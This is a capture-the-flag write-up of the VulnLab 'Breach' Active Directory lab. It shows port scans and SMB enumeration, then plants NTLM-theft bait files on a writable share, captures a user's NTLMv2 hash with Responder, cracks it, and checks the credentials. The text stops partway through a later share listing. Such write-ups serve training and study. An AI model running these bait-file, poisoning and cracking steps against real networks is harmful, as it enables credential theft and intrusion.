---
title: "Breach — VulnLab | Malicious File Upload to SMB, Kerberoasting, Silver Ticket, and AV Shenanigans"
description: "Maverick is back again, rising from the dark shadows to the Cerberus mystery! This time, I’m writing about an awesome machine from VulnLab. It’s got a solid initial access path one I’ve actually cover"
pubDate: 2025-02-25
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 24
coverImage: "https://cdn-images-1.medium.com/max/800/0*tHy9Jbw_7lgjVQQ5"
---

---

![](https://cdn-images-1.medium.com/max/800/0*tHy9Jbw_7lgjVQQ5)

### Breach VulnLab | Malicious File Upload to SMB, Kerberoasting, Silver Ticket, and AV Shenanigans

Maverick is back again, rising from the dark shadows to the Cerberus mystery! This time, I’m writing about an awesome machine from VulnLab. It’s got a solid initial access path one I’ve actually covered before in my little notes from previous write-ups. From there, you grab credentials for the **Julia** user, which lets us pull off some **Kerberoasting**. Then, we dive deep into the madness with a **Silver Ticket** attack to gain access to MSSQL. But oh boy, the **AV** on this one was brutal wiping out all my shells like it had a personal vendetta against me. That’s where **HoaxShell** came in to save the day. From there, I spotted **SeImpersonatePrivilege**, so I pulled out the good ol’ **JuicyPotato** exploit to escalate our privileges and take over the machine!

![](https://cdn-images-1.medium.com/max/800/0*b0xCWV3trt-W3Z3B.gif)

Let’s start by scanning and seeing what’s out there checking for open ports and services, as usual.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nmap -p- --min-rate=1000 -T3 -sC -sV -oN full_tcp_scan.txt 10.10.67.132  
  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 10:02 EET  
Stats: 0:05:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 98.80% done; ETC: 10:08 (0:00:04 remaining)  
Stats: 0:05:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 98.89% done; ETC: 10:08 (0:00:04 remaining)  
Stats: 0:07:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 96.09% done; ETC: 10:10 (0:00:00 remaining)  
Nmap scan report for 10.10.67.132  
Host is up (1.0s latency).  
Not shown: 65519 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open http Microsoft IIS httpd 10.0  
| http-methods:  
|_ Potentially risky methods: TRACE  
|_http-title: IIS Windows Server  
|_http-server-header: Microsoft-IIS/10.0  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-ntlm-info:  
| 10.10.67.132:1433:  
| Target_Name: BREACH  
| NetBIOS_Domain_Name: BREACH  
| NetBIOS_Computer_Name: BREACHDC  
| DNS_Domain_Name: breach.vl  
| DNS_Computer_Name: BREACHDC.breach.vl  
| DNS_Tree_Name: breach.vl  
|_ Product_Version: 10.0.20348  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2025-02-24T08:02:48  
|_Not valid after: 2055-02-24T08:02:48  
|_ssl-date: 2025-02-24T08:10:24+00:00; +8s from scanner time.  
| ms-sql-info:  
| 10.10.67.132:1433:  
| Version:  
| name: Microsoft SQL Server 2019 RTM  
| number: 15.00.2000.00  
| Product: Microsoft SQL Server 2019  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
3269/tcp open tcpwrapped  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=BREACHDC.breach.vl  
| Not valid before: 2025-02-23T08:02:00  
|_Not valid after: 2025-08-25T08:02:00  
|_ssl-date: 2025-02-24T08:10:24+00:00; +9s from scanner time.  
| rdp-ntlm-info:  
| Target_Name: BREACH  
| NetBIOS_Domain_Name: BREACH  
| NetBIOS_Computer_Name: BREACHDC  
| DNS_Domain_Name: breach.vl  
| DNS_Computer_Name: BREACHDC.breach.vl  
| DNS_Tree_Name: breach.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-24T08:09:45+00:00  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open msrpc Microsoft Windows RPC  
52116/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
52338/tcp open msrpc Microsoft Windows RPC  
55286/tcp open msrpc Microsoft Windows RPC  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-02-24T08:09:45  
|_ start_date: N/A  
|_clock-skew: mean: 8s, deviation: 0s, median: 8s  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 449.08 seconds
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389 -sCV -oN nmap 10.10.67.132  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 10:12 EET  
Nmap scan report for 10.10.67.132  
Host is up (0.55s latency).  
  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
80/tcp open http Microsoft IIS httpd 10.0  
| http-methods:  
|_ Potentially risky methods: TRACE  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: IIS Windows Server  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-24 08:13:10Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ms-sql-ntlm-info:  
| 10.10.67.132:1433:  
| Target_Name: BREACH  
| NetBIOS_Domain_Name: BREACH  
| NetBIOS_Computer_Name: BREACHDC  
| DNS_Domain_Name: breach.vl  
| DNS_Computer_Name: BREACHDC.breach.vl  
| DNS_Tree_Name: breach.vl  
|_ Product_Version: 10.0.20348  
| ms-sql-info:  
| 10.10.67.132:1433:  
| Version:  
| name: Microsoft SQL Server 2019 RTM  
| number: 15.00.2000.00  
| Product: Microsoft SQL Server 2019  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2025-02-24T08:02:48  
|_Not valid after: 2055-02-24T08:02:48  
|_ssl-date: 2025-02-24T08:14:22+00:00; +8s from scanner time.  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2025-02-24T08:14:22+00:00; +9s from scanner time.  
| ssl-cert: Subject: commonName=BREACHDC.breach.vl  
| Not valid before: 2025-02-23T08:02:00  
|_Not valid after: 2025-08-25T08:02:00  
| rdp-ntlm-info:  
| Target_Name: BREACH  
| NetBIOS_Domain_Name: BREACH  
| NetBIOS_Computer_Name: BREACHDC  
| DNS_Domain_Name: breach.vl  
| DNS_Computer_Name: BREACHDC.breach.vl  
| DNS_Tree_Name: breach.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-02-24T08:13:43+00:00  
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:  
| date: 2025-02-24T08:13:43  
|_ start_date: N/A  
|_clock-skew: mean: 8s, deviation: 0s, median: 7s  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 99.69 seconds
```

As you can see, like most AD machines, there’s SMB, LDAP, Kerberos, and DNS. Okay, I won’t dive deep into the enumeration phase this time because I’ve already covered the general methodology in previous write-ups. Instead, I’ll just drop the important stuff and tell you what you need to do. And, as always, I’m here to share my mindset when attacking AD

Let’s start with SMB. I’ll check for anonymous login, list the shares, and see what access we have. I’ll use **smbclient** and **nexec**, but you can go beyond that with tools like **rpcclient**, **manspider**, and more.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nxc smb breach.vl -u test -p '' --shares  
SMB 10.10.67.132 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)  
SMB 10.10.67.132 445 BREACHDC [+] breach.vl\test: (Guest)  
SMB 10.10.67.132 445 BREACHDC [*] Enumerated shares  
SMB 10.10.67.132 445 BREACHDC Share Permissions Remark  
SMB 10.10.67.132 445 BREACHDC ----- ----------- ------  
SMB 10.10.67.132 445 BREACHDC ADMIN$ Remote Admin  
SMB 10.10.67.132 445 BREACHDC C$ Default share  
SMB 10.10.67.132 445 BREACHDC IPC$ READ Remote IPC  
SMB 10.10.67.132 445 BREACHDC NETLOGON Logon server share  
SMB 10.10.67.132 445 BREACHDC share READ,WRITE  
SMB 10.10.67.132 445 BREACHDC SYSVOL Logon server share  
SMB 10.10.67.132 445 BREACHDC Users READ
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nxc smb breach.vl -u test -p '' --spider Users  
SMB 10.10.67.132 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)  
SMB 10.10.67.132 445 BREACHDC [+] breach.vl\test: (Guest)  
SMB 10.10.67.132 445 BREACHDC [*] Started spidering  
SMB 10.10.67.132 445 BREACHDC [*] Spidering .  
SMB 10.10.67.132 445 BREACHDC [*] Done spidering (Completed in 204.8162100315094)
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# smbclient -L 10.10.67.132 -N  
  
Sharename Type Comment  
--------- ---- -------  
ADMIN$ Disk Remote Admin  
C$ Disk Default share  
IPC$ IPC Remote IPC  
NETLOGON Disk Logon server share  
share Disk  
SYSVOL Disk Logon server share  
Users Disk  
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 10.10.67.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available
```

```bash
root@kali:/home/kali/VulnLab/Breach# smbclient -U invalid -N \\\\breach.vl\\share -c 'recurse;ls'  
. D 0 Mon Feb 24 10:16:27 2025  
.. DHS 0 Thu Feb 17 17:38:00 2022  
finance D 0 Thu Feb 17 13:19:34 2022  
software D 0 Thu Feb 17 13:19:12 2022  
transfer D 0 Thu Feb 17 16:00:35 2022  
  
\finance  
. D 0 Thu Feb 17 13:19:34 2022  
.. D 0 Mon Feb 24 10:16:27 2025  
  
\software  
. D 0 Thu Feb 17 13:19:12 2022  
.. D 0 Mon Feb 24 10:16:27 2025  
  
\transfer  
. D 0 Thu Feb 17 16:00:35 2022  
.. D 0 Mon Feb 24 10:16:27 2025  
claire.pope D 0 Thu Feb 17 13:21:35 2022  
diana.pope D 0 Thu Feb 17 13:21:19 2022  
julia.wong D 0 Thu Feb 17 13:24:39 2022  
  
\transfer\claire.pope  
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*  
  
\transfer\diana.pope  
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*  
  
\transfer\julia.wong  
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# smbclient //10.10.67.132/share -U Test  
Password for [WORKGROUP\Test]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Mon Feb 24 10:46:13 2025  
.. DHS 0 Thu Feb 17 17:38:00 2022  
finance D 0 Thu Feb 17 13:19:34 2022  
software D 0 Thu Feb 17 13:19:12 2022  
transfer D 0 Thu Feb 17 16:00:35 2022  
  
7863807 blocks of size 4096. 2872422 blocks available  
smb: \> cd transfer  
smb: \transfer\> ls  
. D 0 Thu Feb 17 16:00:35 2022  
.. D 0 Mon Feb 24 10:46:13 2025  
claire.pope D 0 Thu Feb 17 13:21:35 2022  
diana.pope D 0 Thu Feb 17 13:21:19 2022  
julia.wong D 0 Thu Feb 17 13:24:39 2022  
  
7863807 blocks of size 4096. 2872422 blocks available  
smb: \transfer\>
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nxc smb breach.vl -u test -p '' -M spider_plus  
SMB 10.10.67.132 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)  
SMB 10.10.67.132 445 BREACHDC [+] breach.vl\test: (Guest)  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] DOWNLOAD_FLAG: False  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] STATS_FLAG: True  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus  
SMB 10.10.67.132 445 BREACHDC [*] Enumerated shares  
SMB 10.10.67.132 445 BREACHDC Share Permissions Remark  
SMB 10.10.67.132 445 BREACHDC ----- ----------- ------  
SMB 10.10.67.132 445 BREACHDC ADMIN$ Remote Admin  
SMB 10.10.67.132 445 BREACHDC C$ Default share  
SMB 10.10.67.132 445 BREACHDC IPC$ READ Remote IPC  
SMB 10.10.67.132 445 BREACHDC NETLOGON Logon server share  
SMB 10.10.67.132 445 BREACHDC share READ,WRITE  
SMB 10.10.67.132 445 BREACHDC SYSVOL Logon server share  
SMB 10.10.67.132 445 BREACHDC Users READ  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.67.132.json".  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] SMB Shares: 7 (ADMIN$, C$, IPC$, NETLOGON, share, SYSVOL, Users)  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] SMB Readable Shares: 3 (IPC$, share, Users)  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] SMB Writable Shares: 1 (share)  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] SMB Filtered Shares: 1  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] Total folders found: 63  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] Total files found: 67  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] File size average: 27.75 KB  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] File size min: 3 B  
SPIDER_PLUS 10.10.67.132 445 BREACHDC [*] File size max: 512 KB
```

As you can see, there’s **read and write** permissions on **“Share”**, while **“Users”** and **“IPC$”** are **read-only**. I logged into **“Share”** and found some juicy stuff, as shown in **smbclient**. Now, I’ll try uploading a **malicious file** to SMB to capture NTLM hashes.

> Attention: In usual AD testing, you should dig deep for users and gather as many as possible to check their validity. This helps with attacks like Kerberoasting, AS-REP roasting, and of course, password spraying . But I won’t do that this time because, as I said before, I’ve already covered it. If you’re not familiar with this, I highly recommend reading my previous write-ups to dive deeper into the process.

Inspired by a ton of articles on this attack, I found a **great **[**tool** ](https://github.com/Greenwolf/ntlm_theft)that automates creating the [**SCF **](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)**file** and uploads it for me. After that, I simply ran **Responder** to grab those sweet NTLM hashes.

I uploaded the **SCF file** using a **one-liner command** and ran **Responder** to start listening for incoming NTLM hashes.

> Is this attack familiar to you? 😏 Have you ever done an LLMNR/NBNS poisoning attack before? Oh man, you’re tough! 💪🔥

```bash
root@kali:/home/kali/VulnLab/Breach/ntlm_theft-master# python3 ntlm_theft.py -s 10.8.5.124 -f mav -g all                                                                      
Created: mav/mav.scf (BROWSE TO FOLDER)                                                                                                                                       
Created: mav/mav-(url).url (BROWSE TO FOLDER)                                                                                                                                 
Created: mav/mav-(icon).url (BROWSE TO FOLDER)                                                                                                                                
Created: mav/mav.lnk (BROWSE TO FOLDER)                                                                                                                                       
Created: mav/mav.rtf (OPEN)                                                                                                                                                   
Created: mav/mav-(stylesheet).xml (OPEN)                                                                                                                                      
Created: mav/mav-(fulldocx).xml (OPEN)                                                                                                                                        
Created: mav/mav.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)                                                                                                              
Created: mav/mav-(includepicture).docx (OPEN)                                                                                                                                 
Created: mav/mav-(remotetemplate).docx (OPEN)                                                                                                                                 
Created: mav/mav-(frameset).docx (OPEN)                                                                                                                                       
Created: mav/mav-(externalcell).xlsx (OPEN)                                                                                                                                   
Created: mav/mav.wax (OPEN)                                                                                                                                                   
Created: mav/mav.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)                                                                                                                      
Created: mav/mav.asx (OPEN)                                                                                                                                                   
Created: mav/mav.jnlp (OPEN)                                                                                                                                                  
Created: mav/mav.application (DOWNLOAD AND OPEN)                                                                                                                              
Created: mav/mav.pdf (OPEN AND ALLOW)                                                                                                                                         
Created: mav/zoom-attack-instructions.txt (PASTE TO CHAT)                                                                                                                     
Created: mav/Autorun.inf (BROWSE TO FOLDER)                                                                                                                                   
Created: mav/desktop.ini (BROWSE TO FOLDER)                                                                                                                                   
Generation Complete.                                                                                                                                                          
                        
root@kali:/home/kali/VulnLab/Breach/ntlm_theft-master/mav# ls                                                                                                                 
 Autorun.inf               'mav-(icon).url'              mav.rtf                                                                                                              
 mav.application           'mav-(includepicture).docx'   mav.scf                                                                                                              
 mav.asx                    mav.jnlp                    'mav-(stylesheet).xml'                                                                                                
'mav-(externalcell).xlsx'   mav.lnk                     'mav-(url).url'                                                                                                       
'mav-(frameset).docx'       mav.m3u                      mav.wax                                                                                                              
'mav-(fulldocx).xml'        mav.pdf                      desktop.ini                                                                                                          
 mav.htm                   'mav-(remotetemplate).docx'   zoom-attack-instructions.txt     
root@kali:/home/kali/VulnLab/Breach/ntlm_theft-master/mav# for file in $(ls .); do smbclient -c "cd transfer; put $file" \\\\10.10.67.132\\share -N; done                                    
putting file Autorun.inf as \transfer\Autorun.inf (0.0 kb/s) (average 0.0 kb/s)  
putting file mav.application as \transfer\mav.application (1.0 kb/s) (average 1.0 kb/s)  
putting file mav.asx as \transfer\mav.asx (0.1 kb/s) (average 0.1 kb/s)  
putting file mav-(externalcell).xlsx as \transfer\mav-(externalcell).xlsx (3.5 kb/s) (average 3.5 kb/s)  
putting file mav-(frameset).docx as \transfer\mav-(frameset).docx (6.0 kb/s) (average 6.0 kb/s)  
do_connect: Connection to 10.10.67.132 failed (Error NT_STATUS_IO_TIMEOUT)  
putting file mav.htm as \transfer\mav.htm (0.0 kb/s) (average 0.0 kb/s)  
do_connect: Connection to 10.10.67.132 failed (Error NT_STATUS_IO_TIMEOUT)  
putting file mav-(includepicture).docx as \transfer\mav-(includepicture).docx (3.6 kb/s) (average 3.6 kb/s)  
do_connect: Connection to 10.10.67.132 failed (Error NT_STATUS_IO_TIMEOUT)  
putting file mav.lnk as \transfer\mav.lnk (1.3 kb/s) (average 1.3 kb/s)  
putting file mav.m3u as \transfer\mav.m3u (0.0 kb/s) (average 0.0 kb/s)  
putting file mav.pdf as \transfer\mav.pdf (0.5 kb/s) (average 0.5 kb/s)  
putting file mav-(remotetemplate).docx as \transfer\mav-(remotetemplate).docx (11.6 kb/s) (average 11.6 kb/s)  
putting file mav.rtf as \transfer\mav.rtf (0.1 kb/s) (average 0.1 kb/s)  
putting file mav.scf as \transfer\mav.scf (0.0 kb/s) (average 0.0 kb/s)  
putting file mav-(stylesheet).xml as \transfer\mav-(stylesheet).xml (0.1 kb/s) (average 0.1 kb/s)  
putting file mav-(url).url as \transfer\mav-(url).url (0.0 kb/s) (average 0.0 kb/s)  
putting file mav.wax as \transfer\mav.wax (0.0 kb/s) (average 0.0 kb/s)  
putting file desktop.ini as \transfer\desktop.ini (0.0 kb/s) (average 0.0 kb/s)  
putting file zoom-attack-instructions.txt as \transfer\zoom-attack-instructions.txt (0.1 kb/s) (average 0.1 kb/s)
```

```bash
██ ██ ██  
░██ ░██ ░░█  
░██ ██████ ░ ██████  
░██░░░██░ ██░░░░  
░██ ░██ ░░█████  
░██ ░██ ░░░░░██  
░██ ░░██ ██████  
░░ ░░ ░░░░░░  
████ ████ ██ ██  
░██░██ ██░██ ░░ ░██  
░██░░██ ██ ░██ ██████ ██ ██ █████ ██████ ██ █████ ░██ ██  
░██ ░░███ ░██ ░░░░░░██ ░██ ░██ ██░░░██░░██░░█░██ ██░░░██░██ ██  
░██ ░░█ ░██ ███████ ░░██ ░██ ░███████ ░██ ░ ░██░██ ░░ ░████  
░██ ░ ░██ ██░░░░██ ░░████ ░██░░░░ ░██ ░██░██ ██░██░██  
░██ ░██░░████████ ░░██ ░░██████░███ ░██░░█████ ░██░░██  
░░ ░░ ░░░░░░░░ ░░ ░░░░░░ ░░░ ░░ ░░░░░ ░░ ░░  
  
@@@@@@@@@@ @@@@@@ @@@@@@@ @@@ @@@ @@@ @@@ @@@ @@@@@@@@  
@@@@@@@@@@@ @@@@@@@@ @@@@@@@@ @@@ @@@ @@@ @@@@ @@@ @@@@@@@@  
@@! @@! @@! @@! @@@ !@@ @@! @@@ @@! @@!@!@@@ @@!  
!@! !@! !@! !@! @!@ !@! !@! @!@ !@! !@!!@!@! !@!  
@!! !!@ @!@ @!@!@!@! !@! @!@!@!@! !!@ @!@ !!@! @!!!:!  
!@! ! !@! !!!@!!!! !!! !!!@!!!! !!! !@! !!! !!!!!:  
!!: !!: !!: !!! :!! !!: !!! !!: !!: !!! !!:  
:!: :!: :!: !:! :!: :!: !:! :!: :!: !:! :!:  
::: :: :: ::: ::: ::: :: ::: :: :: :: :: ::::  
: : : : : :: :: : : : : : :: : : :: ::  
  
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# sudo responder -I tun1  
__  
.----.-----.-----.-----.-----.-----.--| |.-----.----.  
| _| -__|__ --| _ | _ | | _ || -__| _|  
|__| |_____|_____| __|_____|__|__|_____||_____|__|  
|__|  
  
NBT-NS, LLMNR & MDNS Responder 3.1.4.0  
  
To support this project:  
Github -> https://github.com/sponsors/lgandx  
Paypal -> https://paypal.me/PythonResponder  
  
Author: Laurent Gaffie (laurent.gaffie@gmail.com)  
To kill this script hit CTRL-C  
  
  
[+] Poisoners:  
LLMNR [ON]  
NBT-NS [ON]  
MDNS [ON]  
DNS [ON]  
DHCP [OFF]  
  
[+] Servers:  
HTTP server [ON]  
HTTPS server [ON]  
WPAD proxy [OFF]  
Auth proxy [OFF]  
SMB server [ON]  
Kerberos server [ON]  
SQL server [ON]  
FTP server [ON]  
IMAP server [ON]  
POP3 server [ON]  
SMTP server [ON]  
DNS server [ON]  
LDAP server [ON]  
MQTT server [ON]  
RDP server [ON]  
DCE-RPC server [ON]  
WinRM server [ON]  
SNMP server [OFF]  
  
[+] HTTP Options:  
Always serving EXE [OFF]  
Serving EXE [OFF]  
Serving HTML [OFF]  
Upstream Proxy [OFF]  
  
[+] Poisoning Options:  
Analyze Mode [OFF]  
Force WPAD auth [OFF]  
Force Basic Auth [OFF]  
Force LM downgrade [OFF]  
Force ESS downgrade [OFF]  
  
[+] Generic Options:  
Responder NIC [tun1]  
Responder IP [10.8.5.124]  
Responder IPv6 [fe80::53f9:223e:5ec6:2c20]  
Challenge set [random]  
Don't Respond To Names ['ISATAP', 'ISATAP.LOCAL']  
  
[+] Current Session Variables:  
Responder Machine Name [WIN-ESJZDQXJWBZ]  
Responder Domain Name [KTJF.LOCAL]  
Responder DCE-RPC Port [46795]  
  
[+] Listening for events...  
  
[SMB] NTLMv2-SSP Client : 10.10.67.132  
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong  
[SMB] NTLMv2-SSP Hash : Julia.Wong::BREACH:5a8fd7c86d8a60e7:7F50D2736306C0AC15E302BC44EAC1CE:0101000000000000006D3A66B186DB01154028222E60548D00000000020008004B0054004A00460001001E00570049004E002D00450053004A005A004400510058004A00570042005A0004003400570049004E002D00450053004A005A004400510058004A00570042005A002E004B0054004A0046002E004C004F00430041004C00030014004B0054004A0046002E004C004F00430041004C00050014004B0054004A0046002E004C004F00430041004C0007000800006D3A66B186DB01060004000200000008003000300000000000000001000000002000007B82380BCF8C9C1723A137255721F8FC9C4CB553FA2003A02113E749F8FAEAF90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0035002E003100320034000000000000000000  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[*] Skipping previously captured hash for BREACH\Julia.Wong  
[+] Exiting...  
[*] Skipping previously captured hash for BREACH\Julia.Wong
```

And here we go with the hash! 🎉 Let’s try cracking it with **John** — though if you’re feeling fancy, you can use [**Hashcat**](https://hacklido.com/blog/865-pentesting-active-directory-part-4-llmnr-poisoning) instead .Your call! 😈🔥

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# john breach.txt --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Computer1 (Julia.Wong)  
1g 0:00:00:00 DONE (2025-02-24 12:18) 5.263g/s 635957p/s 635957c/s 635957C/s bratz1234..042602  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed.
```

After running **show**, we got our creds. Now it’s time to check their validity using **netexec**, as usual. The creds are valid for **SMB, LDAP, and MSSQL**, giving us multiple ways to move forward.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nxc ldap 10.10.67.132 -u julia.wong -p 'Computer1'  
SMB 10.10.67.132 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.67.132 389 BREACHDC [+] breach.vl\julia.wong:Computer1  
  
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# nxc smb 10.10.67.132 -u julia.wong -p 'Computer1'  
  
SMB 10.10.67.132 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)  
SMB 10.10.67.132 445 BREACHDC [+] breach.vl\julia.wong:Computer1 
```

Now, there are two things we should do:

1. **Run BloodHound** with these creds to map out the attack surface and see what opportunities we have.
2. **Think like an attacker** dig deeper with a breach mindset, just like in a real engagement.

But if you just want the flag? 🤔 Simply run `-M spider_plus` in **netexec**, and you’ll find `\transfer\julia.wong\`, where you can grab **local.txt**—aka the **user.txt flag**.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/Breach]  
└─# smbclient //10.10.67.132/share -U "julia.wong"  
Password for [WORKGROUP\julia.wong]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Mon Feb 24 11:11:20 2025  
.. DHS 0 Thu Feb 17 17:38:00 2022  
@evil.scf A 88 Mon Feb 24 11:16:51 2025  
@evil.url A 111 Mon Feb 24 11:16:49 2025  
@evil.xml A 175 Mon Feb 24 11:16:48 2025  
finance D 0 Thu Feb 17 13:19:34 2022  
software D 0 Mon Feb 24 11:21:50 2025  
transfer D 0 Mon Feb 24 11:06:34 2025  
  
7863807 blocks of size 4096. 2872298 blocks available  
smb: \> cd software  
smb: \software\> ls  
. D 0 Mon Feb 24 11:21:50 2025  
.. D 0 Mon Feb 24 11:11:20 2025  
@evil.scf A 88 Mon Feb 24 11:21:51 2025  
  
7863807 blocks of size 4096. 2872298 blocks available  
smb: \software\> cd ..  
smb: \> cd transfer  
smb: \transfer\> ls  
. D 0 Mon Feb 24 11:06:34 2025  
.. D 0 Mon Feb 24 11:11:20 2025  
@mal.txt A 93 Mon Feb 24 11:06:35 2025  
@mav.url A 112 Mon Feb 24 10:59:10 2025  
claire.pope D 0 Thu Feb 17 13:21:35 2022  
diana.pope D 0 Thu Feb 17 13:21:19 2022  
julia.wong D 0 Thu Feb 17 13:24:39 2022  
  
7863807 blocks of size 4096. 2872298 blocks available  
smb: \transfer\> cd julia.wong  
smb: \transfer\julia.wong\> ls  
